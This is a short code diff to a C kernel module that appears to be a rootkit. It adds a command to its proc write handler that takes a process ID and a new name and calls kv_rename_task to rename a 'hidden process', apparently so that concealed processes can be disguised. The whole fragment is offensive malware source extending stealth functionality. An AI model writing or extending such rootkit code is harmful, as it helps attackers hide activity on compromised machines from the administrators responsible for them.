@@ -549,6 +549,14 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                     set_elfbits(bits);
                 }
             }
+            /* rename a hidden process */
+        } else if (!strncmp(buf, "-n", MIN(2,size))) {
+            const char *s = &buf[3];
+            char *newname;
+            pid = (pid_t)simple_strtol(s, NULL, 10);
+            newname = strrchr(buf, ' ');
+            if (newname)
+                kv_rename_task(pid, newname);
         }
     }
     proc_timeout(PRC_RESET);
